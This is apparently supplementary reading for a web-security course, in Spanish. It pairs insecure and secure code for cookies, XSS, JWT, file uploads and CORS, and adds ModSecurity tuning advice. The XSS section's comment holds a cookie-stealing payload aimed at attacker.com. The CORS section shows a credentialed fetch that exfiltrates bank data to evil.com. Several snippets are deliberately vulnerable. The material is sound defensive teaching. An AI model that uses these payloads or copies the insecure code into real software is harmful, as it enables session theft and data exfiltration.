# Lectura adicional — Módulo 5: código inseguro vs seguro

Material complementario del Módulo 5 — código inseguro vs seguro, para repasar después de la clase. No se dicta en vivo: la clase (última hora de la Clase 5) se enfoca en la matriz ataque→defensa y en los resúmenes de cada control. Estos son los ejemplos de código completos que quedaron fuera del deck por tiempo.

---

## Cookies — código inseguro vs seguro

**Inseguro (Node.js / Express):**

```js
res.cookie('session', token)
// Sin atributos → XSS roba la cookie, CSRF funciona, viaja por HTTP
```

**Seguro:**

```js
res.cookie('session', token, {
  httpOnly: true,    // JS no puede leer la cookie
  secure:   true,    // Solo viaja por HTTPS
  sameSite: 'lax',   // Protección básica contra CSRF
  maxAge:   3_600_000  // 1 hora de vida
})
```

Un objeto de opciones → tres vectores de ataque cerrados simultáneamente.

### Referencia rápida: atributos de cookies seguras

- **HttpOnly**: JavaScript no puede leer la cookie
- **Secure**: solo viaja por HTTPS
- **SameSite**: restringe envío cross-site

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

Sin estos flags: XSS puede robar la sesión, tráfico en HTTP puede exponer cookies, CSRF se vuelve mucho más simple.

| Valor SameSite | Comportamiento | Uso típico |
| --- | --- | --- |
| Strict | Nunca se envía cross-site | Paneles sensibles |
| Lax | Permite navegación top-level GET | Sesiones web comunes |
| None | Permite cross-site | SSO o integraciones; requiere `Secure` |

**Recomendación general:** `Lax` o `Strict` para cookies de sesión.

**Para inspeccionar en Burp:** logueate en Juice Shop, capturá el response, revisá `Set-Cookie` en Proxy o Repeater, identificá si faltan `HttpOnly`, `Secure` o `SameSite`.

---

## XSS — código vulnerable vs seguro

**Vulnerable (PHP — concatenación directa):**

```php
echo "<p>Hola, " . $_GET['name'] . "</p>";
// ?name=<script>document.location='http://attacker.com/'+document.cookie</script>
```

**Seguro (PHP — encoding contextual):**

```php
echo "<p>Hola, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";
```

**En React:**

```jsx
// JSX escapa automáticamente
return <p>Hola, {name}</p>

// JAMAS con input de usuario
return <p dangerouslySetInnerHTML={{ __html: name }} />
```

### Referencia rápida: output encoding contextual

Cada contexto requiere encoding distinto — no existe "sanitización universal":

| Contexto | Defensa |
| --- | --- |
| HTML | `htmlspecialchars()` / escaping del templating |
| JavaScript | `JSON.stringify()` / no concatenar strings |
| URL | `encodeURIComponent()` |
| SQL | Prepared statements |

---

## JWT — código inseguro vs seguro

**Inseguro:**

```js
const token = jwt.sign({ userId: 1, role: 'admin' }, 'secret')
// ❌ Secreto débil, sin expiración, sin algoritmo explícito

const data = jwt.decode(token)   // ❌ No verifica firma — cualquier token pasa
```

**Seguro:**

```js
const token = jwt.sign(
  { userId: 1, role: 'admin' },
  process.env.JWT_SECRET,                   // ≥ 32 bytes random
  { expiresIn: '1h', algorithm: 'HS256' }
)

jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] }, (err, payload) => {
  if (err) return res.status(401).json({ error: 'Token inválido' })
  req.user = payload
  next()
})
```

---

## File Upload — código inseguro vs seguro

**Inseguro (PHP):**

```php
$filename = $_FILES['file']['name'];                       // nombre del usuario
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$filename");
echo "Acceso: uploads/$filename";                          // URL directa → ejecución
```

**Seguro (PHP):**

```php
$allowed = ['image/jpeg', 'image/png'];
$mime    = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['file']['tmp_name']);

if (!in_array($mime, $allowed))        die('Tipo no permitido');
if ($_FILES['file']['size'] > 2000000) die('Archivo demasiado grande');

$name = bin2hex(random_bytes(16)) . '.jpg';   // nombre aleatorio
$dest = '/var/uploads/' . $name;              // fuera del webroot
move_uploaded_file($_FILES['file']['tmp_name'], $dest);
chmod($dest, 0644);                           // sin permisos de ejecución
```

---

## CORS — el flujo completo de un ataque por Origin reflejado

El deck ya cubre la idea central (nunca reflejar `Origin` sin validarlo). Acá el flujo paso a paso:

```http
Access-Control-Allow-Origin: https://evil.com   ← servidor refleja el header Origin sin validar
Access-Control-Allow-Credentials: true           ← las cookies viajan
```

1. Víctima tiene sesión activa en `banco.com`
2. Visita `evil.com` → JS hace fetch con `credentials: 'include'`
3. El browser envía las cookies → servidor responde con datos reales
4. `evil.com` **lee la respuesta** (el servidor la autorizó explícitamente)

```javascript
fetch('https://api-banco.com/saldo', { credentials: 'include' })
  .then(r => r.json())
  .then(data => exfiltrar(data));  // funciona porque el servidor reflejó el Origin
```

### Nota sobre `Access-Control-Allow-Origin: *`

| Tipo de auth | ¿Viaja con `*`? | Riesgo |
|---|---|---|
| Cookie / PHPSESSIONID | ❌ Browser bloquea `credentials` con `*` | ✅ Seguro |
| Authorization: Bearer | ❌ No viaja automático | ✅ Seguro |
| Sin auth (endpoint público) | ✅ Viaja libre | ⚠️ Solo si los datos son sensibles |

El browser **prohíbe por spec** combinar `*` con `credentials: 'include'`. `*` sí es un problema cuando el endpoint no requiere auth pero expone datos que no deberían ser públicos.

---

## ModSecurity + OWASP CRS (detalle de implementación)

- **ModSecurity**: WAF open source para Apache/Nginx
- **OWASP CRS**: reglas estándar mantenidas por la comunidad
- Estrategia sana:
  1. modo detección
  2. revisar falsos positivos
  3. endurecer gradualmente

```bash
SecRuleEngine DetectionOnly
```

Primero observá. Después bloqueá con evidencia.
